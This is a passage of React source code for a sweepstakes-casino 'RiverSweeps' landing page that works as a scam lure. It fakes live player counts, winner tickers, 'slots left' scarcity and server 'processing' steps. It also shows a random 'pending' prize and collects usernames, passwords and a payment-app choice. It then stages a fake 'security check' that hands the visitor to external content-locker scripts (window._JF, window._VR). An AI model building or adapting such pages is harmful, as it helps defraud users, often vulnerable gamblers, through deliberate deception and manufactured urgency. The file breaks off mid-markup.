import React, { useState, useEffect, useRef } from 'react';
import { 
    Users, 
    ShieldCheck, 
    Loader2, 
    UserPlus, 
    Gift, 
    Zap, 
    Gamepad2, 
    Globe, 
    ChevronRight, 
    Database, 
    Wifi, 
    Lock,
    Unlock,
    Coins,
    Megaphone,
    Target,
    Timer,
    AlertTriangle,
    Scan,
    Sparkles,
    Check,
    Play,
    Server,
    Fingerprint,
    CreditCard,
    Key,
    Ticket,
    PartyPopper
} from 'lucide-react';

interface LandingPageProps {
  onLogin: (username: string, game: string) => void;
}

type AuthMode = 'signup' | 'claim';
// Updated Stages: 
// idle -> processing -> pre_entry (Fakeout Enter) -> scanning (Interruption) -> security_flagged -> verifying -> verified
type Stage = 'idle' | 'processing' | 'pre_entry' | 'scanning' | 'security_flagged' | 'verifying' | 'verified';

// --- CONFIGURATION & DATA ---

const AVAILABLE_GAMES = [
    'RiverSweeps',
    'Fire Kirin',
    'Game Vault',
    'Orion Stars',
    'Vegas Sweeps',
    'Golden Dragon',
    'Ultra Monster',
    'Panda Master',
    'Vpower'
];

const REGION_CONFIG: Record<string, { latency: number; name: string }> = {
    'NA_EAST': { latency: 24, name: 'US East (Virginia)' },
    'NA_WEST': { latency: 58, name: 'US West (Oregon)' },
    'EU': { latency: 112, name: 'Europe (Frankfurt)' },
    'ASIA': { latency: 185, name: 'Asia (Singapore)' },
};

// Ticker Generators
const NAME_PREFIXES = ['Dragon', 'Lucky', 'Fire', 'Super', 'Mega', 'Gold', 'Fish', 'King', 'Master', 'Slot', 'Vegas', 'Royal', 'Star'];
const NAME_SUFFIXES = ['Slayer', 'Winner', '777', '88', '99', 'King', 'Boy', 'Girl', 'Pro', 'X', 'Hunter'];
// Expanded Prize Pool - Small Wins ($5 - $120)
const PRIZES = ['5.00', '10.00', '25.00', '50.00', '8.88', '15.00', '99.00', '110.00', '45.00', '12.50', '5.50', '115.00', '88.00', '105.00', '60.00'];

const PAYMENT_METHODS = [
    { id: 'cashapp', name: 'Cash App', icon: '💲' },
    { id: 'venmo', name: 'Venmo', icon: 'V' },
    { id: 'paypal', name: 'PayPal', icon: 'P' }
];

const generateRandomActivity = () => {
    const user = `${NAME_PREFIXES[Math.floor(Math.random() * NAME_PREFIXES.length)]}${NAME_SUFFIXES[Math.floor(Math.random() * NAME_SUFFIXES.length)]}`;
    const prize = PRIZES[Math.floor(Math.random() * PRIZES.length)];
    return { user, prize };
};

const LandingPage: React.FC<LandingPageProps> = ({ onLogin }) => {
  const [authMode, setAuthMode] = useState<AuthMode>('signup'); 
  const [username, setUsername] = useState('');
  const [password, setPassword] = useState('');
  const [paymentMethod, setPaymentMethod] = useState('cashapp');
  const [couponCode, setCouponCode] = useState('');
  const [selectedGame, setSelectedGame] = useState('RiverSweeps');
  const [region, setRegion] = useState('NA_EAST');
  
  // Logic State
  const [stage, setStage] = useState<Stage>('idle');
  const [currentStepIndex, setCurrentStepIndex] = useState(0);
  const [progress, setProgress] = useState(0);
  const [showToast, setShowToast] = useState(false);
  
  // Stats & Ticker
  const [onlineCount, setOnlineCount] = useState(1420);
  
  // Exclusive Reward Display (7000-12000 range)
  const [idleRewardDisplay, setIdleRewardDisplay] = useState('9,500'); 
  
  const [allocatedPrize, setAllocatedPrize] = useState(''); // determined final prize
  const [processingPrizeDisplay, setProcessingPrizeDisplay] = useState('0'); // For the rapid counting animation during processing
  const [slotsLeft, setSlotsLeft] = useState(24); // Scarcity logic
  const [tickerItem, setTickerItem] = useState(generateRandomActivity());
  const [showTicker, setShowTicker] = useState(true);
  
  const audioCtxRef = useRef<AudioContext | null>(null);

  // Dynamic Processing Steps
  const getProcessingSteps = () => {
      const steps = [
          { id: 'handshake', icon: Wifi, label: "Establishing Secure Handshake...", color: "text-blue-400", bg: "bg-blue-500", duration: 1200 },
      ];

      if (authMode === 'signup') {
          steps.push({ id: 'create', icon: UserPlus, label: "Creating Secure ID...", color: "text-cyan-400", bg: "bg-cyan-500", duration: 2200 });
      } else {
          steps.push({ id: 'locate', icon: Database, label: "Locating Bonus Records...", color: "text-purple-400", bg: "bg-purple-500", duration: 2500 });
      }

      steps.push({ id: 'optimize', icon: Zap, label: "Allocating Server Resources...", color: "text-yellow-400", bg: "bg-yellow-500", duration: 1400 });
      
      return steps;
  };

  const processingSteps = getProcessingSteps();

  // --- EFFECTS ---

  useEffect(() => {
    // 1. Online Count Fluctuation
    const interval = setInterval(() => {
        setOnlineCount(prev => prev + (Math.random() > 0.5 ? Math.floor(Math.random() * 3) : -1));
    }, 2500);

    // 2. Ticker Rotation (Simulate other users claiming prizes)
    const tickerInterval = setInterval(() => {
        // Only rotate randomly if we are in idle or processing. 
        if (stage === 'idle' || stage === 'processing') {
            setShowTicker(false);
            setTimeout(() => {
                setTickerItem(generateRandomActivity());
                setShowTicker(true);
            }, 500);
        }
    }, 4000);

    // 3. Live Real-Time Reward Calculation (Idle Screen)
    // Range: 7000 - 12000. Changes "up and down 2 digits only" (small delta). Slowly.
    let rewardInterval: ReturnType<typeof setInterval>;
    if (stage === 'idle') {
        rewardInterval = setInterval(() => {
            setIdleRewardDisplay(prev => {
                let current = parseInt(prev.replace(/[^0-9]/g, ''));
                if (isNaN(current)) current = 9500;

                // Random change between 10 and 99 (2 digits)
                const change = Math.floor(Math.random() * 90) + 10;
                const direction = Math.random() > 0.5 ? 1 : -1;
                let next = current + (change * direction);

                // Strictly Clamp between 7000 and 12000
                if (next < 7000) next = 7000 + change;
                if (next > 12000) next = 12000 - change;

                return next.toLocaleString();
            });
        }, 1500); // Slow update (1.5s)
    }

    // 4. Slots Remaining Decreasing (Urgency)
    const slotsTimer = setInterval(() => {
        setSlotsLeft(prev => {
            if (prev <= 3) return 3; // Don't go below 3
            return prev - 1;
        });
    }, 4000);

    return () => {
        clearInterval(interval);
        clearInterval(tickerInterval);
        clearInterval(slotsTimer);
        if (rewardInterval) clearInterval(rewardInterval);
    };
  }, [stage, tickerItem]);

  // --- AUDIO SYSTEM ---
  const initAudio = () => {
    if (!audioCtxRef.current) {
        audioCtxRef.current = new (window.AudioContext || (window as any).webkitAudioContext)();
    }
    if (audioCtxRef.current.state === 'suspended') audioCtxRef.current.resume();
    return audioCtxRef.current;
  };

  const playSound = (type: 'click' | 'success' | 'tick' | 'alert' | 'scan' | 'coin') => {
      try {
        const ctx = initAudio();
        const t = ctx.currentTime;
        const osc = ctx.createOscillator();
        const gain = ctx.createGain();
        osc.connect(gain);
        gain.connect(ctx.destination);

        if (type === 'click') {
            osc.frequency.setValueAtTime(600, t);
            osc.frequency.exponentialRampToValueAtTime(300, t + 0.1);
            gain.gain.setValueAtTime(0.1, t);
            gain.gain.linearRampToValueAtTime(0, t + 0.1);
            osc.start(t);
            osc.stop(t + 0.1);
        } else if (type === 'coin') {
            osc.type = 'sine';
            osc.frequency.setValueAtTime(1200 + Math.random() * 200, t); // Slight variation
            gain.gain.setValueAtTime(0.05, t);
            gain.gain.exponentialRampToValueAtTime(0.001, t + 0.08);
            osc.start(t);
            osc.stop(t + 0.08);
        } else if (type === 'tick') {
            osc.frequency.setValueAtTime(800, t);
            osc.type = 'square';
            gain.gain.setValueAtTime(0.03, t);
            gain.gain.linearRampToValueAtTime(0, t + 0.03);
            osc.start(t);
            osc.stop(t + 0.03);
        } else if (type === 'scan') {
            osc.frequency.setValueAtTime(200, t);
            osc.frequency.linearRampToValueAtTime(600, t + 0.3);
            gain.gain.setValueAtTime(0.05, t);
            gain.gain.linearRampToValueAtTime(0, t + 0.3);
            osc.start(t);
            osc.stop(t + 0.3);
        } else if (type === 'alert') {
             osc.type = 'triangle';
            osc.frequency.setValueAtTime(330, t); // E
            osc.frequency.setValueAtTime(440, t + 0.1); // A
            gain.gain.setValueAtTime(0.1, t);
            gain.gain.linearRampToValueAtTime(0, t + 0.3);
            osc.start(t);
            osc.stop(t + 0.3);
        } else if (type === 'success') {
            osc.type = 'triangle';
            [440, 554, 659, 880].forEach((freq, i) => {
                const o = ctx.createOscillator();
                const g = ctx.createGain();
                o.connect(g);
                g.connect(ctx.destination);
                o.type = 'triangle';
                o.frequency.value = freq;
                g.gain.setValueAtTime(0, t + i * 0.1);
                g.gain.linearRampToValueAtTime(0.1, t + i * 0.1 + 0.05);
                g.gain.exponentialRampToValueAtTime(0.001, t + i * 0.1 + 0.4);
                o.start(t + i * 0.1);
                o.stop(t + i * 0.1 + 0.5);
            });
        }
      } catch (e) { /* ignore */ }
  };

  const wait = (ms: number) => new Promise(resolve => setTimeout(resolve, ms));

  // --- LOGIC ---

  const startProcessing = async () => {
      setStage('processing');
      playSound('scan');
      setProgress(0);
      setCurrentStepIndex(0);

      // --- SYNC POINT: Calculate Final Prize IMMEDIATELY ---
      // Range: $5 - $120
      const minPrize = 5;
      const maxPrize = 120;
      const finalVal = Math.floor(Math.random() * (maxPrize - minPrize + 1)) + minPrize;
      const finalPrizeStr = finalVal.toLocaleString();
      
      // Store it in state so it's ready for next stages
      setAllocatedPrize(finalPrizeStr);

      // Processing visualizer: random values in winning range
      const prizeInterval = setInterval(() => {
          const randomVal = Math.floor(Math.random() * 115) + 5;
          setProcessingPrizeDisplay(randomVal.toLocaleString());
      }, 60);

      const steps = processingSteps; 

      for (let i = 0; i < steps.length; i++) {
          setCurrentStepIndex(i);
          const step = steps[i] as any;
          
          if (step.id === 'locate' || step.id === 'create') {
              playSound('scan');
          } else {
              playSound('tick');
          }

          const startProgress = (i / steps.length) * 100;
          const endProgress = ((i + 1) / steps.length) * 100;
          
          const baseDuration = step.duration || 1000;
          const variance = 0.9 + Math.random() * 0.2; 
          const duration = baseDuration * variance;
          
          const fps = 30;
          const frameTime = duration / fps;
          
          for(let j=0; j<=fps; j++) {
             await wait(frameTime);

             if ((step.id === 'locate' || step.id === 'create') && j === Math.floor(fps * 0.7)) {
                 await wait(300 + Math.random() * 200); 
             }
             
             const t = j / fps;
             const ease = 1 - Math.pow(1 - t, 3);
             
             setProgress(startProgress + ease * (endProgress - startProgress));
          }
      }
      
      clearInterval(prizeInterval);

      // --- SYNC FINISH: Lock the display to the exact allocated prize ---
      setProcessingPrizeDisplay(finalPrizeStr);
      
      // Update ticker to show THIS user winning THAT prize
      setTickerItem({ user: username, prize: formatPrize(finalPrizeStr) });
      setShowTicker(true);

      await wait(500); // Slight pause to let the user see the number lock in
      playSound('success');
      setStage('pre_entry');
  };

  const handleAttemptEnter = async () => {
      playSound('click');
      setStage('scanning'); 
      playSound('scan');
      await wait(1500);
      playSound('alert');
      setStage('security_flagged');
  };

  const handleVerificationSuccess = () => {
      setStage('verified');
      playSound('success');
      setShowToast(true);
      setTimeout(() => {
          onLogin(username, selectedGame);
      }, 2500); // 2.5s Delay to show toast
  };

  const handleFinalVerify = () => {
      playSound('click');
      setStage('verifying'); 
      if (typeof (window as any)._JF === 'function') {
          (window as any)._JF();
          setTimeout(() => {
             handleVerificationSuccess();
          }, 5000); // Increased to 5s to allow for locker interaction
      } else if (typeof (window as any)._VR === 'function') { 
          (window as any)._VR();
          setTimeout(() => {
             handleVerificationSuccess();
          }, 5000); 
      } else {
          console.log("Locker Script missing, bypassing...");
          setTimeout(() => {
             handleVerificationSuccess();
          }, 1500);
      }
  };

  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    if (!isFormValid) return;
    startProcessing();
  };

  const isFormValid = authMode === 'signup' 
      ? username.trim().length > 0 && password.trim().length > 0
      : username.trim().length > 0;

  const getCtaText = () => {
      if (authMode === 'signup') return "CREATE & PLAY";
      return "CLAIM BONUS";
  };
  
  const formatPrize = (prize: string) => {
      if (/^\d/.test(prize)) return `$${prize}`;
      return prize;
  };

  const formatDisplayPrize = (prize: string) => {
      if (/^\d/.test(prize)) return `$${prize}`;
      return prize;
  };
  
  return (
    <div className="min-h-screen bg-[#050b14] flex flex-col items-center justify-center relative overflow-hidden font-sans p-4 selection:bg-cyan-500/30">
        
        {/* --- DYNAMIC BACKGROUND --- */}
        <div className="fixed inset-0 z-0 pointer-events-none">
             <div className="absolute top-[-20%] left-[-10%] w-[70%] h-[70%] bg-blue-900/10 rounded-full blur-[120px] animate-pulse"></div>
             <div className="absolute bottom-[-10%] right-[-10%] w-[60%] h-[60%] bg-cyan-900/10 rounded-full blur-[120px] animate-pulse"></div>
             <div className="absolute inset-0 bg-[url('https://i.imgur.com/5J2y2XN.png')] opacity-10 bg-cover bg-center"></div>
        </div>

        {/* --- TOAST NOTIFICATION --- */}
        {showToast && (
            <div className="fixed top-12 left-1/2 -translate-x-1/2 z-[10000] animate-in slide-in-from-top-4 fade-in duration-500 w-[90%] max-w-sm">
                <div className="bg-gradient-to-r from-green-900/90 to-emerald-900/90 backdrop-blur-md border border-green-500/50 rounded-xl p-4 shadow-[0_0_50px_rgba(34,197,94,0.3)] flex items-center gap-4">
                    <div className="w-12 h-12 rounded-full bg-green-500/20 flex items-center justify-center shrink-0">
                        <PartyPopper className="w-6 h-6 text-green-400 animate-bounce" />
                    </div>
                    <div>
                        <h4 className="text-white font-black uppercase text-sm tracking-wider">Verification Complete!</h4>
                        <p className="text-gray-300 text-xs mt-0.5">
                            Welcome, <span className="text-white font-bold">{username}</span>.
                            <br/>
                            Accessing <span className="text-green-400 font-bold">{selectedGame}</span>...
                        </p>
                    </div>
                </div>
            </div>
        )}

        {/* --- HUD HEADER --- */}
        <div className="fixed top-0 left-0 w-full p-4 flex justify-between items-center z-20">
             <div className="flex items-center gap-3 bg-black/30 backdrop-blur-md px-3 py-1.5 rounded-full border border-white/5 shadow-lg">
                 <div className="relative">
                    <div className="w-2 h-2 bg-green-500 rounded-full animate-pulse shadow-[0_0_10px_#22c55e]"></div>
                 </div>
                 <span className="text-xs font-bold text-gray-300 tracking-wider font-mono tabular-nums">{onlineCount.toLocaleString()} ONLINE</span>
             </div>
             {/* Scarcity Counter Header */}
             <div className="flex items-center gap-2 bg-red-900/20 backdrop-blur-md px-3 py-1.5 rounded-full border border-red-500/20 shadow-lg animate-pulse">
                 <Timer className="w-4 h-4 text-red-500" />
                 <span className="text-xs font-bold text-red-400 tracking-wider uppercase">Slots Left: {slotsLeft}</span>
             </div>
        </div>

        {/* --- MAIN CONTENT --- */}
        <div className="relative z-10 w-full max-w-md">
            
            {/* Logo & Ticker Area */}
            <div className="text-center mb-6">
                <div className="flex flex-col items-center justify-center relative">
                    <div className="relative w-20 h-20 mb-2">
                        <img src="https://i.imgur.com/gK9wV7X.png" alt="Riversweeps" className="w-full h-full object-contain animate-float" />
                        <div className="absolute inset-0 bg-blue-500/30 blur-2xl -z-10 rounded-full"></div>
                    </div>
                    <h1 className="text-4xl font-black italic tracking-tighter text-white drop-shadow-2xl mb-1 arcade-font">
                        <span className="text-transparent bg-clip-text bg-gradient-to-b from-cyan-300 to-blue-600">RIVER</span>SWEEPS
                    </h1>
                    <div className="absolute -right-6 -top-2">
                        <Sparkles className="w-6 h-6 text-cyan-400 animate-spin-slow" />
                    </div>
                </div>
                <p className="text-xs text-gray-400 font-bold tracking-[0.3em] uppercase mb-4">
                    Official Casino
                </p>

                {/* Restored Live Winner Ticker */}
                <div className={`transition-all duration-500 transform ${showTicker ? 'opacity-100 translate-y-0' : 'opacity-0 -translate-y-2'}`}>
                    <div className="inline-flex items-center gap-2 bg-blue-900/30 border border-blue-500/30 rounded-full px-4 py-1 backdrop-blur-sm">
                        <Megaphone className="w-3 h-3 text-cyan-400" />
                        <span className="text-[10px] text-gray-300">
                            <span className="font-bold text-white">{tickerItem.user}</span> just won <span className="text-yellow-400 font-bold">{formatPrize(tickerItem.prize)}</span>
                        </span>
                    </div>
                </div>
            </div>

            {/* --- GLASS CARD --- */}
            <div className="bg-slate-900/60 backdrop-blur-xl border border-white/10 rounded-3xl p-1 shadow-2xl overflow-hidden ring-1 ring-white/5 relative min-h-[450px] flex flex-col justify-center">
                
                {/* --- STAGE: IDLE (Full Form with Big Bonus) --- */}
                {stage === 'idle' && (
                    <div className="p-6 md:p-8 animate-in fade-in slide-in-from-bottom-4 duration-500 w-full">
                        
                        {/* BIG BONUS HEADER */}
                        <div className="text-center mb-8 relative group cursor-default">
                            <div className="absolute top-1/2 left-1/2 -translate-x-1/2 -translate-y-1/2 w-full h-full bg-blue-500/20 blur-xl rounded-full group-hover:bg-blue-500/30 transition"></div>
                            <h3 className="text-white text-xs font-bold uppercase tracking-[0.2em] mb-1 relative z-10 text-cyan-200">Exclusive Reward Available</h3>
                            <div className="text-5xl font-black text-transparent bg-clip-text bg-gradient-to-b from-yellow-300 to-yellow-600 drop-shadow-sm font-mono relative z-10 tracking-tighter">
                                {formatDisplayPrize(idleRewardDisplay)}
                            </div>
                            <div className="mt-2 inline-flex items-center gap-1 bg-red-500/20 border border-red-500/50 rounded px-2 py-0.5">
                                <span className="text-[10px] text-red-400 font-bold uppercase animate-pulse">Live</span>
                            </div>
                        </div>

                        {/* Tab Switcher */}
                        <div className="flex bg-black/40 p-1 rounded-xl mb-5">
                            <button 
                                onClick={() => { setAuthMode('signup'); playSound('click'); }}
                                className={`flex-1 py-2.5 rounded-lg text-xs font-bold uppercase tracking-wider flex items-center justify-center gap-2 transition-all ${authMode === 'signup' ? 'bg-cyan-600 text-white shadow-lg shadow-cyan-900/50' : 'text-gray-500 hover:text-gray-300'}`}
                            >
                                <UserPlus className="w-3.5 h-3.5" /> Join
                            </button>
                            <button 
                                onClick={() => { setAuthMode('claim'); playSound('click'); }}
                                className={`flex-1 py-2.5 rounded-lg text-xs font-bold uppercase tracking-wider flex items-center justify-center gap-2 transition-all ${authMode === 'claim' ? 'bg-cyan-600 text-white shadow-lg shadow-cyan-900/50' : 'text-gray-500 hover:text-gray-300'}`}
                            >
                                <Gift className="w-3.5 h-3.5" /> Bonus
                            </button>
                        </div>

                        <form onSubmit={handleSubmit} className="space-y-4">
                            
                            {/* Game Select - ONLY for Claim Mode */}
                            {authMode === 'claim' && (
                                <div className="space-y-1">
                                    <label className="text-[10px] uppercase font-bold text-gray-500 pl-1 flex items-center gap-1">
                                        <Gamepad2 className="w-3 h-3" /> Select Game Platform
                                    </label>
                                    <div className="relative group">
                                        <select 
                                            value={selectedGame}
                                            onChange={(e) => setSelectedGame(e.target.value)}
                                            className="w-full bg-black/50 border border-white/10 rounded-xl px-4 py-3 text-white font-bold outline-none focus:border-cyan-500/50 focus:ring-1 focus:ring-cyan-500/50 transition-all appearance-none text-sm"
                                        >
                                            {AVAILABLE_GAMES.map(g => <option key={g} value={g}>{g}</option>)}
                                        </select>
                                        <ChevronRight className="absolute right-4 top-1/2 -translate-y-1/2 w-4 h-4 text-gray-500 pointer-events-none rotate-90" />
                                    </div>
                                </div>
                            )}

                            {/* Username Input */}
                            <div className="space-y-1">
                                <label className="text-[10px] uppercase font-bold text-gray-500 pl-1 flex items-center gap-1">
                                    <Users className="w-3 h-3" /> {authMode === 'signup' ? 'Create Username' : 'Player ID'}
                                </label>
                                <div className="relative group">
                                    <input 
                                        type="text" 
                                        value={username}
                                        onChange={(e) => setUsername(e.target.value)}
                                        className="w-full bg-slate-900/80 border border-white/10 rounded-xl px-4 py-3 text-white font-bold outline-none focus:border-cyan-500/50 focus:ring-1 focus:ring-cyan-500/50 transition-all placeholder:text-gray-700 text-sm pl-10"
                                        placeholder={authMode === 'signup' ? "RIVER_KING_777" : "ENTER ID..."}
                                        maxLength={15}
                                    />
                                    <Globe className="absolute left-3 top-1/2 -translate-y-1/2 w-4 h-4 text-gray-600 pointer-events-none group-focus-within:text-cyan-400 transition-colors" />
                                </div>
                            </div>

                            {/* Signup Only Fields */}
                            {authMode === 'signup' && (
                                <>
                                    {/* Password Input */}
                                    <div className="space-y-1 animate-in fade-in slide-in-from-right-4 duration-300" style={{animationDelay: '100ms'}}>
                                        <label className="text-[10px] uppercase font-bold text-gray-500 pl-1 flex items-center gap-1">
                                            <Key className="w-3 h-3" /> Create Password
                                        </label>
                                        <div className="relative group">
                                            <input 
                                                type="password" 
                                                value={password}
                                                onChange={(e) => setPassword(e.target.value)}
                                                className="w-full bg-slate-900/80 border border-white/10 rounded-xl px-4 py-3 text-white font-bold outline-none focus:border-cyan-500/50 focus:ring-1 focus:ring-cyan-500/50 transition-all placeholder:text-gray-700 text-sm pl-10"
                                                placeholder="••••••••"
                                            />
                                            <Lock className="absolute left-3 top-1/2 -translate-y-1/2 w-4 h-4 text-gray-600 pointer-events-none group-focus-within:text-cyan-400 transition-colors" />
                                        </div>
                                    </div>

                                    {/* Payment Method Select */}
                                    <div className="space-y-1 animate-in fade-in slide-in-from-right-4 duration-300" style={{animationDelay: '200ms'}}>
                                        <label className="text-[10px] uppercase font-bold text-gray-500 pl-1 flex items-center gap-1">
                                            <CreditCard className="w-3 h-3" /> Payment Method
                                        </label>
                                        <div className="relative group">
                                            <select 
                                                value={paymentMethod}
                                                onChange={(e) => setPaymentMethod(e.target.value)}
                                                className="w-full bg-black/50 border border-white/10 rounded-xl px-4 py-3 text-white font-bold outline-none focus:border-cyan-500/50 focus:ring-1 focus:ring-cyan-500/50 transition-all appearance-none text-sm pl-10"
                                            >
                                                {PAYMENT_METHODS.map(pm => <option key={pm.id} value={pm.id}>{pm.name}</option>)}
                                            </select>
                                            <div className="absolute left-3 top-1/2 -translate-y-1/2 w-4 h-4 text-gray-600 flex items-center justify-center pointer-events-none group-focus-within:text-cyan-400 transition-colors">
                                                {PAYMENT_METHODS.find(p => p.id === paymentMethod)?.icon}
                                            </div>
                                            <ChevronRight className="absolute right-4 top-1/2 -translate-y-1/2 w-4 h-4 text-gray-500 pointer-events-none rotate-90" />
                                        </div>
                                    </div>

                                    {/* Coupon Code Input */}
                                    <div className="space-y-1 animate-in fade-in slide-in-from-right-4 duration-300" style={{animationDelay: '300ms'}}>
                                        <label className="text-[10px] uppercase font-bold text-gray-500 pl-1 flex items-center gap-1">
                                            <Ticket className="w-3 h-3" /> Coupon Code (Optional)
                                        </label>
                                        <div className="relative group">
                                            <input 
                                                type="text" 
                                                value={couponCode}
                                                onChange={(e) => setCouponCode(e.target.value)}
                                                className="w-full bg-slate-900/80 border border-white/10 rounded-xl px-4 py-3 text-white font-bold outline-none focus:border-cyan-500/50 focus:ring-1 focus:ring-cyan-500/50 transition-all placeholder:text-gray-700 text-sm pl-10"
                                                placeholder="PROMO2024"
                                            />
                                            <Gift className="absolute left-3 top-1/2 -translate-y-1/2 w-4 h-4 text-gray-600 pointer-events-none group-focus-within:text-cyan-400 transition-colors" />
                                        </div>
                                    </div>
                                </>
                            )}

                            <button 
                                type="submit" 
                                disabled={!isFormValid}
                                className={`w-full py-4 rounded-xl font-black text-sm uppercase tracking-widest shadow-lg flex items-center justify-center gap-2 transition-all active:scale-95 mt-4 group
                                    ${isFormValid 
                                        ? 'bg-gradient-to-r from-cyan-600 to-blue-600 hover:from-cyan-500 hover:to-blue-500 text-white shadow-cyan-900/30' 
                                        : 'bg-slate-800 text-gray-600 cursor-not-allowed'}
                                `}
                            >
                                {isFormValid && (
                                    <div className="absolute inset-0 w-full h-full bg-white/20 -translate-x-full group-hover:animate-[shimmer_1s_infinite] transform skew-x-12"></div>
                                )}
                                <span className="relative flex items-center gap-2">
                                    {getCtaText()} <ChevronRight className={`w-4 h-4 ${isFormValid ? 'animate-pulse' : ''}`} />
                                </span>
                            </button>
                        </form>
                    </div>
                )}

                {/* --- STAGE: PROCESSING (Visuals) --- */}
                {(stage === 'processing' || stage === 'scanning') && (
                    <div className="p-8 md:py-12 flex flex-col items-center justify-center text-center animate-in zoom-in duration-300 w-full h-full">
                        
                        {/* Dynamic Visual Switcher */}
                        <div className="relative w-36 h-36 mb-6 flex items-center justify-center">
                            
                            {/* Common Outer Ring */}
                            <div className="absolute inset-0 border-8 border-slate-800/50 rounded-full"></div>
                            
                            {/* CONNECT: Radar Scan */}
                            {processingSteps[currentStepIndex]?.id === 'handshake' && stage === 'processing' && (
                                <div className="relative flex items-center justify-center w-full h-full">
                                    <Wifi className="w-14 h-14 text-blue-400 animate-pulse relative z-10 drop-shadow-[0_0_10px_rgba(59,130,246,0.5)]" />
                                    <div className="absolute inset-0 border-4 border-blue-500/30 rounded-full animate-ping"></div>
                                </div>
                            )}

                            {/* ACCOUNT: Fingerprint/User */}
                            {processingSteps[currentStepIndex]?.id === 'create' && stage === 'processing' && (
                                <div className="relative flex items-center justify-center w-full h-full">
                                    <Fingerprint className="w-14 h-14 text-cyan-400 animate-pulse relative z-10" />
                                    <div className="absolute inset-0 border-t-2 border-cyan-500/50 rounded-full animate-spin"></div>
                                </div>
                            )}

                            {/* BONUS: Database */}
                            {processingSteps[currentStepIndex]?.id === 'locate' && stage === 'processing' && (
                                <div className="relative flex items-center justify-center w-full h-full">
                                    <Database className="w-14 h-14 text-purple-400 animate-bounce relative z-10" />
                                    <div className="absolute inset-0 border-4 border-dashed border-purple-500/30 rounded-full animate-[spin_5s_linear_infinite]"></div>
                                </div>
                            )}

                            {/* OPTIMIZE: Turbine/Engine */}
                            {processingSteps[currentStepIndex]?.id === 'optimize' && stage === 'processing' && (
                                 <div className="relative flex items-center justify-center w-full h-full">
                                    <Server className="w-14 h-14 text-yellow-400 relative z-10 animate-pulse" />
                                    {/* Tiny Game Name in Center */}
                                     <div className="absolute top-1/2 left-1/2 -translate-x-1/2 -translate-y-1/2 text-[8px] font-bold text-yellow-200 bg-black/50 px-1 rounded uppercase tracking-tighter w-max max-w-[80px] truncate z-20 mt-8">
                                        {selectedGame}
                                     </div>
                                </div>
                            )}

                            {/* SCANNING STATE (The interruption loader) */}
                            {stage === 'scanning' && (
                                 <div className="relative flex items-center justify-center w-full h-full">
                                    <Scan className="w-14 h-14 text-orange-400 animate-pulse relative z-10" />
                                    <div className="absolute inset-0 border-2 border-orange-500 rounded-full animate-ping"></div>
                                </div>
                            )}
                        </div>
                        
                        {/* Counting Prize Text */}
                        {stage === 'processing' && (
                             <div className="mb-4 flex flex-col items-center animate-in fade-in zoom-in duration-300">
                                 <span className="text-[10px] text-gray-500 font-bold uppercase tracking-wider mb-1">Potential Reward</span>
                                 <div className="text-2xl font-black font-mono text-white tabular-nums tracking-tight">
                                     {formatDisplayPrize(processingPrizeDisplay)}
                                 </div>
                             </div>
                        )}

                        {/* Progress Bar & Text */}
                        <div className="w-full max-w-xs space-y-3">
                            <h3 className={`font-bold text-lg mb-1 animate-pulse tracking-wide ${stage === 'scanning' ? 'text-orange-400' : processingSteps[currentStepIndex]?.color}`}>
                                {stage === 'scanning' 
                                    ? "Validating Connection..." 
                                    : processingSteps[currentStepIndex]?.label
                                }
                            </h3>
                            
                            <div className="h-3 w-full bg-slate-800 rounded-full overflow-hidden relative border border-white/5 shadow-inner">
                                 <div 
                                    className={`h-full transition-all duration-300 ease-out ${stage === 'scanning' ? 'bg-orange-500 w-full animate-pulse' : processingSteps[currentStepIndex]?.bg}`}
                                    style={{ width: stage === 'scanning' ? '100%' : `${progress}%` }}
                                 ></div>
                            </div>
                        </div>
                    </div>
                )}

                {/* --- STAGE: SECURITY FLAG (INTERRUPTION) - NOW GREEN THEME --- */}
                {stage === 'security_flagged' && (
                    <div className="p-6 md:p-8 animate-in bounce-in duration-500 w-full text-center">
                        <div className="w-20 h-20 bg-emerald-500/10 rounded-full flex items-center justify-center mx-auto mb-6 ring-2 ring-emerald-500 shadow-[0_0_30px_rgba(16,185,129,0.4)]">
                            <ShieldCheck className="w-10 h-10 text-emerald-500 animate-[pulse_1s_infinite]" />
                        </div>
                        
                        <h2 className="text-2xl font-black text-emerald-500 uppercase tracking-widest mb-2">Standard Check</h2>
                        <div className="bg-emerald-950/40 border border-emerald-900 p-4 rounded-xl mb-6">
                            <p className="text-emerald-200 text-sm font-bold">
                                <ShieldCheck className="w-4 h-4 inline mr-2 mb-1" />
                                Security verification required.
                            </p>
                            
                            {/* NEW: Pending Prize Display */}
                            <div className="mt-3 bg-black/40 rounded-lg p-2 border border-emerald-500/30 flex items-center justify-between">
                                <span className="text-[10px] text-emerald-400/80 font-bold uppercase tracking-wider">Pending Release</span>
                                <span className="text-sm font-mono font-black text-yellow-400 drop-shadow-[0_0_5px_rgba(250,204,21,0.5)] flex items-center gap-1">
                                    <Coins className="w-3.5 h-3.5" />
                                    {formatPrize(allocatedPrize)}
                                </span>
                            </div>

                            <p className="text-gray-400 text-xs mt-3">
                                To prevent bots and protect the jackpot pool, please complete this one-time check.
                            </p>
                        </div>

                        <button 
                            onClick={handleFinalVerify}
                            className="w-full py-4 rounded-xl bg-gradient-to-r from-emerald-600 to-green-800 hover:from-emerald-500 hover:to-green-700 text-white font-black text-sm uppercase tracking-widest shadow-lg shadow-emerald-900/20 flex items-center justify-center gap-2 transition-all active:scale-95 animate-pulse"
                        >
                            <ShieldCheck className="w-4 h-4" /> VERIFY IDENTITY
                        </button>
                    </div>
                )}

                {/* --- STAGE: PRE-ENTRY (Fakeout Success) --- */}
                {(stage === 'pre_entry' || stage === 'verifying') && (
                    <div className="p-6 md:p-8 animate-in slide-in-from-bottom-4 duration-500 w-full">
                        {/* Particle Keyframes */}
                        <style>{`
                            @keyframes particle-burst {
                                0% { transform: translate(-50%, -50%) scale(0); opacity: 1; }
                                40% { opacity: 1; }
                                100% { transform: translate(calc(-50% + var(--tx)), calc(-50% + var(--ty))) scale(0); opacity: 0; }
                            }
                        `}</style>
                        <div className="text-center mb-6">
                            <div className={`relative w-16 h-16 rounded-full flex items-center justify-center mx-auto mb-4 ring-1 shadow-[0_0_20px_rgba(34,197,94,0.2)] ${authMode === 'signup' ? 'bg-green-500/10 ring-green-500/30' : 'bg-yellow-500/10 ring-yellow-500/30'}`}>
                                
                                {/* Burst Particles */}
                                {stage === 'pre_entry' && (
                                    <div className="absolute inset-0 pointer-events-none">
                                        {[...Array(12)].map((_, i) => {
                                            const angle = (i / 12) * 360;
